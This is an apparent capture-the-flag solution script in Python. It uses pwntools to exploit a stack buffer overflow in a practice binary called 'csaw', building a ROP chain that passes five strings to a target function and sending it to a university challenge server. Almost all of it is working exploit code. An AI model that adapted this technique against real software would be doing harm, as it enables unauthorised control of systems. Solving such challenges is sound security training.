from pwn import *

# no canary
# we have to call the csaw function ny overwriting the return address
# notice that csaw requires 5 strings as input, we have to call some gadgets
# MIGLIORI HARDWARE HACKERS IN EUROPA


context.binary = exe = ELF("./csaw")
offset_data = 32
#no canary 8=========D - - -
size_rbp = 8

#searching which gadget is available in the exec
rop = ROP(exe)
#for addr, gadget in rop.gadgets.items():
#    print(hex(addr), gadget.insns)
#it returns:
#0x40126a ['pop rcx', 'pop r8', 'ret']
#0x401265 ['pop rdi', 'pop rsi', 'pop rdx', 'ret']

part1 = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]
part2 = rop.find_gadget(['pop rcx', 'pop r8', 'ret'])[0]
#ret = rop.find_gadget(["ret"])[0] # if needed, probably it is
target_function = p64(exe.symbols['csaw'])

payload = b'A'*offset_data
payload += b'B'*size_rbp 
payload += p64(part1)
payload += p64(next(exe.search(b"MIGLIORI"))) #search() produces an iterator , ancd next() produce the next value in the list
payload += p64(next(exe.search(b"HARDWARE")))
payload += p64(next(exe.search(b"HACKERS")))
payload += p64(part2)
payload += p64(next(exe.search(b"IN")))
payload += p64(next(exe.search(b"EUROPA")))
payload += target_function 

p = remote("cyberchallenge.diag.uniroma1.it", "5188")
p.sendline(payload)
while(True):
    print(""+str(p.recvline()))
#rop.call(target_function_address, [arg1, arg2, arg3, arg4, arg5])

